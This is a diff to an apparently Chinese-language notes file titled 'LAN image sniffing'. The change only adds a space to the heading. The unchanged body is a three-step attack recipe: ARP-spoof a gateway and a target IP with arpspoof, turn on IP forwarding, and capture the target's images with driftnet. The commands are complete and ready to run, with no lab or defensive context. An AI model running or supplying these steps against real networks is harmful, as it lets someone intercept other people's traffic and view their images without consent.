@@ -1,4 +1,4 @@
-#内网图片嗅探
+# 内网图片嗅探
 - arp欺骗：arpspoof -i eth0 -t 192.168.1.1(网关) 192.168.1.105(目标IP)
 - 开启路由转发功能：echo 1 > /proc/sys/net/ipv4/ip_forward
 - 利用工具嗅探：driftnet -i eth0
